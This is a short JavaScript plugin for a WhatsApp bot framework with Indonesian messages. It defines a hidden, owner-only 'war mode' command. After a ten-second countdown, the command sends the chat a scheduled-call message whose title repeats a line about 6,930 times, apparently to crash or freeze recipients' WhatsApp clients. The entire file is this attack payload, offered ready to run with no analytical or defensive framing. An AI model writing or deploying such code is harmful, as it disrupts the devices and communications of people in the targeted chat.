neoxr.create(async (m, {
   client,
   text,
   prefix,
   command,
   Scraper, 
   Func
}) => {
       if (command == 'war0896') {
          client.reply(m.chat, '*MODE WAR AKTIF*⚔️\n_SILAHKAN EVAKUASI!_\n_IMPACK AKAN AKTIF DALAM 10 detik!_', m) 
          setTimeout(() => {
          client.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "AUDIO",
		scheduledTimestampMs: Date.now(),
		title: "⚔️WAR🔪 🗡MODE!⚔️\n".repeat(99*70), 
		}
	}, {}).then(() => client.reply (m.chat, '*IMPACK*💥🔥', m)
	)
          }, 10000)
          } else if (command == 'war', 'warmode', '⚔️', '🗡','🔪') {
	client.reply(m.chat, '*MASUKAN SANDI*\n_UNTUK AKTIFKAN MODE WAR_', m) 
	}
	
	}, {
   usage: ['war'],
   hidden: ['war0896'],
   category: 'owner',
   owner: true
}, __filename)
	